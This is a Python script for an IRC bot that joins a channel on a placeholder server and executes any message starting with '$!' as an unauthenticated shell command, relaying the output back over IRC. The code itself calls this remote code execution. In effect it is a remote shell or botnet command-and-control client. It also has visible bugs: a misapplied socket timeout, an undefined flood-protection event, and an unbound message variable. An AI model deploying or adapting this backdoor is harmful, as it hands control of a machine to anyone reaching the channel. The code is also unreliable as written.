#!/usr/bin/env python3
import os
import socket
import signal
import threading
import subprocess
import re
import time
import queue

class Server():
    # Setup the IRC related things such as user details and prefixes
    # This function also sets up the threading events and queues
    def __init__(self, realname, nickname, channel, command_prefix = "$!", bot_prefix = "$$", opper_nicknames = []):
        print(f"[SERVER/MAINTHREAD] Using Server() on Python3 PID {os.getpid()}")
        self.realname = realname
        self.nickname = nickname
        self.channel = channel
        self.opper_nicknames = opper_nicknames

        # Prefix for commands to execute
        self.command_prefix = command_prefix

        # Prefix for internal commands
        self.bot_prefix = bot_prefix

        # Used to signal threads to shutdown
        self._going_down = threading.Event()

        # Queue used for messages to send
        self._msg_q = queue.Queue()

        # Rate limiting variables
        # Used so it can be quired by IRC
        self._msg_time = 0
        self._msg_count = 0

        print(f"[SERVER/MAINTHREAD] Using nickname {nickname} on {channel}!")

    # This function handles the socket bring up
    # Sets socket paramaters, and starts the send/recv threads
    def connect(self, ip, port, sock_timeout = 60, sock_sendbuf = 512, sock_recvbuf = 512):
        print(f"[SERVER/MAINTHREAD] Connecting to {ip}:{port}")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f"[SERVER/MAINTHREAD] Using socket timeout of {sock_timeout} seconds!")
        self.sock.settimeout(sock_sendbuf)

        print(f"[SERVER/MAINTHREAD] Using socket send/recv buffer of {sock_sendbuf}/{sock_recvbuf}!")
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, sock_sendbuf)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, sock_recvbuf)

        print("[SERVER/MAINTHREAD] Starting send thread!")
        self._send_thread = threading.Thread(target = self._send_loop, args = (ip,))
        self._send_thread.start()

        print("[SERVER/MAINTHREAD] Starting recieve thread!")
        self._recv_thread = threading.Thread(target = self._recv_loop, args = (ip, port))
        self._recv_thread.start()

    # Gracefully shuts the server down
    def die(self, msg = "Python3 Server() outta here!"):
        print("[SERVER/MAINTHREAD] Sending PART and QUIT")
        # Part all of our channels with a cool message, then quit
        self._msg_q.put(f"PART {self.channel} : {msg}\r\n".encode())
        self._msg_q.put(f"QUIT : {msg}\r\n".encode())

        print("[SERVER/MAINTHREAD] Signaling threads to quit!")
        # Signal threads to quit
        self._going_down.set()

    # Function used to send messages from the queue
    # Rate limiting is also implemented here
    def _send_loop(self, ip):
        while not self._going_down.is_set():
            self._msg_count+=1
            self._msg_time = (0.15 * self._msg_count)**2
            print(f"[SENDTHREAD] Sleeping for {self._msg_time} seconds on message count {self._msg_count}")
            time.sleep(self._msg_time)
            if self._msg_count == 10:
                self._msg_count = 0

            # Grab message and send it
            try:
                msg = self._msg_q.get(timeout = 60)
            except queue.Empty:
                # So the thread signaler works
                print("[SENDTHREAD] Timeout occurred waiting on queue... sending ping!")
                self.sock.send(f"PING :{ip}\r\n".encode())

            print(f"[SENDTHREAD] Sending message: {msg}")
            try:
                self.sock.send(msg)
            except BrokenPipeError:
                # Can't use die because we have no connection... just quit I suppose
                self._going_down.set()

        print("[SENDTHREAD] Quitting due to thread condition!")

    # This is the function used to process messages from the server
    # This is where we actually connect to the IRC server
    def _recv_loop(self, ip, port):
        # Connect to server
        self.sock.connect((ip, port))

        # Send user reg        
        self._send_userreg()

        # Grab receieve buffer size
        bufsize = self.sock.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)

        # Enter main loop
        while not self._going_down.is_set():
            # Grab IRC data and decode text
            try:
                data = self.sock.recv(bufsize)
                data = data.decode("utf-8")
            except UnicodeDecodeError:
                print("[RECVTHREAD] Error decoding message as utf-8!")
                print("[RECVTHREAD] Message: {data}")
                continue
            except socket.timeout:
                # Instead of using another thread, I just use a socket timeout to send pings
                # Kills two birds with one stone as we can't wait forever due to threading Events
                print("[RECVTHREAD] Timeout occurred waiting on server messages... sending ping!")
                self.sock.send(f"PING :{ip}\r\n".encode())
                continue

            # Handle IRC messages
            ircmsgs = data.split("\r\n")
            for msg in ircmsgs:
                parsed_msg = self._parse_message(msg)

                # Ignore blank messages
                if parsed_msg:
                    self._handle_message(parsed_msg)

        # Bye bye main loop
        if self._going_down.is_set():
            print("[RECVTHREAD] Quitting due to thread condition!")

    # This function sends the user details to the IRC server
    # This isn't in the recv thread as we need to run it twice
    # if the nick is in use.
    def _send_userreg(self):       
        self._msg_q.put(f"USER {self.realname} * * :{self.nickname}\r\n".encode())
        self._msg_q.put(f"NICK {self.nickname}\r\n".encode())
        self._msg_q.put(f"JOIN {self.channel}\r\n".encode())
  
    # Used to strip ASCII control characters (such as terminal escape codes)
    # from text. Mainly to avoid unknown command errors from the IRC server.
    def _strip_control_chars(self, text):
        control_char_re = r"[\x00-\x1F\x7F]"
        return re.sub(control_char_re, "*", text)

    # This is where the message parsing actually happens
    def _parse_message(self, msg):
        # Set optional values to None to avoid UnboundLocalError's
        prefix = None
        trailing = None

        # Strip newlines from message
        msg = msg.rstrip("\r\n")

        # Ignore empty messages
        if not msg:
            return

        # Extract message prefix if there is one
        if msg.startswith(":"):
            # Find the first space to split the prefix
            prefix_end = msg.find(" ")
            if prefix_end == -1:
                # Huh?
                return

            # Split out the prefix
            prefix = msg[1:prefix_end]
            msg = msg[prefix_end + 1:]

        # Extract any trailing parameters
        trailing_idx = msg.find(" :")
        if trailing_idx != -1:
            trailing = msg[trailing_idx + 2:]
            msg = msg[:trailing_idx]

        # Extract the command and regular parameters
        parts = msg.split()
        if not parts:
            # Huh?
            return None
        command = parts[0].upper()
        params = parts[1:]

        # Add trailing parameter to params list
        if trailing:
            params.append(trailing)

        return {
            "prefix": prefix,
            "command": command,
            "params": params
        }

    # This is where we handle messages that need to be
    # Most of them can safely be ignored.
    def _handle_message(self, msg):
        debug_msg = self._strip_control_chars(f"[RECVTHREAD] Got message from server! Message: {msg}")
        print(debug_msg)

        # Handle PRIVMSG
        if msg["command"] == "PRIVMSG":
            msg_source = msg["params"][0]
            # Properly decode private messages
            if msg_source == self.nickname:
                source_channel = msg["prefix"].partition("!~")[0]
            else:
                source_channel = msg_source

            # Check for command prefix and run it if we got one
            if msg["params"][-1].startswith(self.command_prefix):
                # Strip command prefix and spaces if any from input
                cmd = msg["params"][-1].strip(self.command_prefix)
                cmd = cmd.strip(" ")

                # Ignore blank commands
                if not cmd:
                    return

                # Run CMDTHREAD
                threading.Thread(target = self._handle_command, args = (cmd, source_channel, )).start()

            # Check for bot prefix
            if msg["params"][-1].startswith(self.bot_prefix):
                # Toggle flood protection in send thread
                if "slow" in msg["params"][-1]:
                    if self._msg_slow_down.is_set():
                        self._msg_q.put(f"PRIVMSG {source_channel} :Flood protection: Disabled\r\n".encode())
                        self._msg_slow_down.clear()
                    else:
                        self._msg_q.put(f"PRIVMSG {source_channel} :Flood protection: Enabled\r\n".encode())
                        self._msg_slow_down.set()
                if "sendq" in msg["params"][-1]:
                    self._msg_q.put(f"PRIVMSG {source_channel} :Send Queue Size: {self._msg_q.qsize()}\r\n".encode())
                if "pid" in msg["params"][-1]:
                    self._msg_q.put(f"PRIVMSG {source_channel} :Bot PID: {os.getpid()}\r\n".encode())
                if "die" in msg["params"][-1]:
                    self.die()
                if "floodstats" in msg["params"][-1]:
                    self._msg_q.put(f"PRIVMSG {source_channel} :Sleep Time: {self._msg_time}\r\n".encode())
                    self._msg_q.put(f"PRIVMSG {source_channel} :Message Count: {self._msg_count}\r\n".encode())

        # Handle nickname already in use by appending the PID
        # and resending user reg
        if msg["command"] == "433":
            self.nickname = f"{self.nickname}-{os.getpid()}"

            print(f"[RECVTHREAD] Nickname already in use! Using: {self.nickname}")
            self._send_userreg()

        # Allow users to add bots to channel, but only if it's me
        if msg["command"] == "INVITE":
            msg_source = msg["params"][0]
            source_user = msg["prefix"].partition("!~")[0]
            if source_user in self.opper_nicknames:
                print(f"[RECVTHREAD] Joining channel by user command!")
                self._msg_q.put(f"JOIN {msg['params'][-1]}\r\n".encode())

    # This is where we actually run the RCE commands and pipe the output
    # back to IRC.
    #
    # No temp files here
    def _handle_command(self, cmd, source_channel):
        print(f"[CMDTHREAD] Running CMD {cmd}!")
        proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.DEVNULL,
        start_new_session=False, text=False)

        # Calculate maximum message size            
        # 512 bytes is max IRC message with <IRCv3 and no cap neg
        msg_without_data = b"PRIVMSG " + self.channel.encode() + b" :" + b"\r\n"
        max_data_len = 512 - len(msg_without_data)
        print(f"[CMDTHREAD] Reading from Popen pipe with len = {max_data_len}!")

        while True:
            # Check for quitting flag
            if self._going_down.is_set():
                print("[CMDTHREAD] Quitting due to thread condition!")
                proc.kill()
                break

            # Read a line up to max_data_len
            # Replace invalid chars with escape sequences
            line = proc.stdout.readline(max_data_len)
            line = line.decode("utf8", errors = "backslashreplace")

            # Check for empty data
            if not line:
                break

            # Remove carraige return to avoid confusing IRC server
            line = line.replace("\r", "")

            # Strip rouge newlines from data
            line = line.replace("\r\n", "")
            line = line.replace("\n", "")

            self._msg_q.put(b"PRIVMSG " + source_channel.encode() + b" :" + line.encode() + b"\r\n")

        # Wait is required to fetch exit code
        proc.wait()
        self._msg_q.put(f"PRIVMSG {source_channel} :CMD {cmd} exited with returncode {proc.returncode}\r\n".encode())

if __name__ == "__main__":
    serv = Server("username", "nickname", "##channel", opper_nicknames = ["opperhere"])
    serv.connect("IP", 6667, sock_recvbuf = 8192)


    # Allow for the user to send raw IRC messages
    # These bypass the send queue
    while True:
        try:
            rawcmd = input()
            serv.sock.send(f"{rawcmd}\r\n".encode())
        except KeyboardInterrupt:
            print("[MAINTHREAD] Interrupt receieved... server going down!")
            print("[MAINTHREAD] Could take up to 60 seconds for socket timeout!")
            serv.die()
            raise SystemExit(0)
